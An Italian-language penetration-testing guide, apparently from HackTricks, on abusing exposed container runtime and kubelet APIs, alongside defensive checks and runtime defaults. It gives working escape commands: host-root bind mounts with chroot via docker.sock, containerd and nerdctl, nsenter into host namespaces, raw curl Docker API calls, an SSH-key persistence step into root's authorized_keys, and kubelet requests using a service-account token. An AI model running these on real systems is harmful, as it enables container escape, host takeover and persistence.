# Esposizione dell'API runtime e del daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molte compromissioni reali dei container non iniziano affatto con una namespace escape. Iniziano con l'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman o kubelet tramite un socket Unix montato o un listener TCP esposto, l'attaccante potrebbe riuscire a richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, l'API del runtime è il vero confine di sicurezza e comprometterla equivale, di fatto, a compromettere l'host.

Per questo l'esposizione del socket del runtime dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities e confinamento MAC ordinari può comunque essere a una sola chiamata API dalla compromissione dell'host, se al suo interno è montato `/var/run/docker.sock` o `/run/containerd/containerd.sock`. L'isolamento del kernel del container corrente può funzionare esattamente come previsto, mentre il piano di gestione del runtime rimane completamente esposto.

## Modelli di accesso al daemon

Tradizionalmente, Docker Engine espone la propria API privilegiata tramite il socket Unix locale `unix:///var/run/docker.sock`. Storicamente è stata esposta anche da remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS sulla porta `2376`. Esporre il daemon da remoto senza TLS robusto e autenticazione dei client trasforma di fatto l'API Docker in un'interfaccia root remota.

containerd, CRI-O, Podman e kubelet espongono superfici simili e di grande impatto. I nomi e i flussi di lavoro cambiano, ma la logica è la stessa. Se l'interfaccia consente al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali o modificare container in esecuzione, è un canale di gestione privilegiato e va trattato come tale.

Un'interfaccia web per la gestione dei container può esporre lo stesso confine senza concedere all'account locale accesso diretto al socket. Ad esempio, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) documentava il ripristino non autenticato della password amministratore in una vecchia build 1.11.1. Considera un'interfaccia raggiungibile localmente solo come un elemento da approfondire: verifica la build installata e il comportamento dell'autenticazione, l'effettivo controllo amministrativo e se l'endpoint gestito può creare container con un bind mount scrivibile dell'host. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) che la gestione basata su socket richiede l'accesso al socket Docker; un endpoint rootless o con restrizioni modifica l'impatto sull'host. Non dedurre la presenza di una falla di autenticazione o l'accesso root all'host basandoti solo sul nome di un processo, una porta o una stringa di versione.

Tra i percorsi locali comuni da controllare ci sono:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Gli stack più datati o specializzati possono esporre anche endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Sono meno comuni negli ambienti moderni, ma, se presenti, vanno trattati con la stessa cautela perché rappresentano superfici di controllo del runtime, non normali socket applicativi.

## Secure Remote Access

Se un daemon deve essere esposto oltre il socket locale, la connessione va protetta con TLS e, preferibilmente, con l’autenticazione reciproca, così che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di esporre il daemon Docker tramite HTTP non cifrato per comodità è uno degli errori più pericolosi nell’amministrazione dei container, perché la superficie API è abbastanza potente da consentire la creazione diretta di container con privilegi elevati.

Il modello di configurazione storico di Docker era simile a questo:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Sugli host basati su systemd, la comunicazione con il daemon può anche apparire come `fd://`, il che significa che il processo eredita da systemd un socket già aperto, invece di associarlo direttamente. La lezione importante non riguarda la sintassi esatta, ma le conseguenze per la sicurezza. Nel momento in cui il daemon si mette in ascolto al di fuori di un socket locale con permessi rigorosi, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie, non più semplici misure di hardening facoltative.

## Abuso

Se è presente un socket del runtime, verifica quale sia, se esiste un client compatibile e se è possibile accedervi tramite HTTP o gRPC grezzi:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Questi comandi sono utili perché permettono di distinguere tra un percorso inesistente, un socket montato ma inaccessibile e un’API privilegiata attiva. Se il client ha esito positivo, la domanda successiva è se l’API può avviare un nuovo container con un bind mount sull’host o condividendo i namespace dell’host.

### Quando non è installato alcun client

L’assenza di `docker`, `podman` o di un’altra CLI intuitiva non significa che il socket sia sicuro. Docker Engine comunica tramite HTTP sul suo socket Unix e Podman espone sia un’API compatibile con Docker sia un’API nativa Libpod tramite `podman system service`. Ciò significa che anche un ambiente minimale con solo `curl` potrebbe bastare per controllare il daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Questo è importante durante la post-exploitation, perché a volte i difensori rimuovono i consueti binari client ma lasciano montato il socket di gestione. Sugli host Podman, ricorda che il percorso di maggior valore è diverso nelle installazioni rootful e rootless: `unix:///run/podman/podman.sock` per le istanze di servizio rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` per quelle rootless.

### Esempio completo: dal socket Docker a root sull'host

Se `docker.sock` è raggiungibile, la classica escape consiste nell'avviare un nuovo container che monta il filesystem root dell'host e poi eseguire `chroot` al suo interno:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Questo consente di eseguire comandi direttamente come root sull'host tramite il daemon Docker. L'impatto non si limita alla lettura di file. Una volta entrato nel nuovo container, l'attaccante può modificare i file dell'host, raccogliere credenziali, installare meccanismi di persistenza o avviare altri workload con privilegi elevati.

### Esempio completo: dal socket Docker ai namespace dell'host

Se l'attaccante preferisce accedere ai namespace invece di limitarsi al filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con un'esposizione esplicita dei namespace dell'host, anziché sfruttando quello corrente.

### Docker Socket Persistence Pattern

Il controllo del runtime può essere usato anche per la persistenza, anziché per una shell monouso. Lo schema generico consiste nel creare un container helper con un mount dell'host, scrivere materiale di accesso autorizzato o un hook di avvio nel filesystem host montato e poi verificare che l'host lo utilizzi.

Esempio:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

La stessa idea può prendere di mira unità systemd, frammenti cron, file di avvio delle applicazioni o chiavi SSH, a seconda di ciò che l'operatore vuole dimostrare. Il punto importante è che la modifica persistente viene effettuata tramite l'autorità del daemon runtime sul filesystem dell'host, non tramite privilegi aggiuntivi nel container originale.

### Raw Docker API Helper Pivot

Quando manca la Docker CLI, lo stesso flusso con helper e mount sull'host può essere eseguito tramite HTTP sul socket Unix. Il flusso generico è: verificare l'API, creare un container helper con un bind mount dell'host, avviarlo, creare un'istanza exec e avviare tale exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

La richiesta finale `/exec/<id>/start` dipende dall'ID exec restituito, ma il punto relativo alla sicurezza è indipendente dai dettagli esatti del JSON: l'accesso diretto all'API di un daemon Docker rootful è sufficiente per richiedere un workload helper con privilegi maggiori.

### Esempio completo: socket di containerd

Un socket `containerd` montato è di solito altrettanto pericoloso:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Se è disponibile un client più simile a Docker, `nerdctl` può essere più pratico di `ctr` perché espone flag familiari come `--privileged`, `--pid=host` e `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

L'impatto è ancora la compromissione dell'host. Anche se non sono presenti strumenti specifici di Docker, un'altra runtime API potrebbe comunque offrire gli stessi privilegi amministrativi. Sui nodi Kubernetes, anche `crictl` può bastare per la reconnaissance e l'interazione con i container, perché comunica direttamente con l'endpoint CRI.

### Socket BuildKit

È facile non notare `buildkitd`, perché spesso lo si considera «solo il backend di build», ma il daemon è comunque un control plane privilegiato. Un `buildkitd.sock` raggiungibile può consentire a un attaccante di eseguire passaggi di build arbitrari, ispezionare le capacità dei worker, usare i contesti locali dell'ambiente compromesso e richiedere entitlements pericolosi come `network.host` o `security.insecure`, se il daemon è stato configurato per consentirli.

Le prime interazioni utili sono:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Se il daemon accetta richieste di build, verifica se sono disponibili entitlement non sicuri:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

L'impatto esatto dipende dalla configurazione del daemon, ma un servizio BuildKit rootful con autorizzazioni permissive non è una semplice comodità per gli sviluppatori. Consideralo un'altra superficie amministrativa di alto valore, soprattutto sui runner CI e sui nodi di build condivisi.

### API del kubelet su TCP

Il kubelet non è un container runtime, ma fa comunque parte del piano di gestione del nodo e rientra spesso nelle discussioni sui confini di fiducia. Se la porta sicura `10250` del kubelet è raggiungibile dal workload, oppure se sono esposte credenziali del nodo, kubeconfig o autorizzazioni di proxy, l'attaccante potrebbe enumerare i Pod, recuperare i log o eseguire comandi nei container locali al nodo senza mai passare dal percorso di ammissione dell'API server Kubernetes.

Inizia con una ricognizione rapida:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Se il percorso proxy del kubelet o dell’API server autorizza `exec`, un client compatibile con WebSocket può trasformarlo in esecuzione di codice in altri container sul nodo. Anche per questo `nodes/proxy` con la sola autorizzazione `get` è più pericoloso di quanto sembri: la richiesta può comunque raggiungere endpoint del kubelet che eseguono comandi, e queste interazioni dirette con il kubelet non compaiono nei normali log di audit di Kubernetes.<sup>[[2]](#references)</sup>

## Checks

L’obiettivo di questi controlli è stabilire se il container può raggiungere un piano di gestione che avrebbe dovuto rimanere al di fuori del perimetro di fiducia.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Cosa c'è di interessante qui:

- Un socket runtime montato è di solito una primitiva amministrativa diretta, non una semplice divulgazione di informazioni.
- Un listener TCP sulla porta `2375` senza TLS dovrebbe essere considerato una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato progettato intenzionalmente per comunicare con il runtime host.

## Impostazioni predefinite dei runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix locale per impostazione predefinita | `dockerd` ascolta sul socket locale e il daemon di solito è rootful | montaggio di `/var/run/docker.sock`, esposizione di `tcp://...:2375`, TLS debole o assente su `2376` |
| Podman | CLI senza daemon per impostazione predefinita | Per il normale uso locale non è richiesto un daemon privilegiato di lunga durata; i socket API possono comunque essere esposti quando è abilitato `podman system service` | esposizione di `podman.sock`, esecuzione del servizio con accesso ampio, uso dell'API rootful |
| containerd | Socket locale privilegiato | API amministrativa esposta tramite il socket locale e di solito utilizzata da strumenti di livello superiore | montaggio di `containerd.sock`, accesso ampio a `ctr` o `nerdctl`, esposizione di namespace privilegiati |
| CRI-O | Socket locale privilegiato | L'endpoint CRI è destinato a componenti fidati locali al nodo | montaggio di `crio.sock`, esposizione dell'endpoint CRI a workload non fidati |
| Kubernetes kubelet | API di gestione locale al nodo | Kubelet non dovrebbe essere ampiamente raggiungibile dai Pod; a seconda di authn/authz, l'accesso può esporre lo stato dei pod, credenziali e funzionalità di esecuzione | montaggio di socket o certificati kubelet, autenticazione kubelet debole, rete host insieme a un endpoint kubelet raggiungibile |

## References

- [1] [sfruttamento del socket containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rischi di bypass dell'API Server di Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
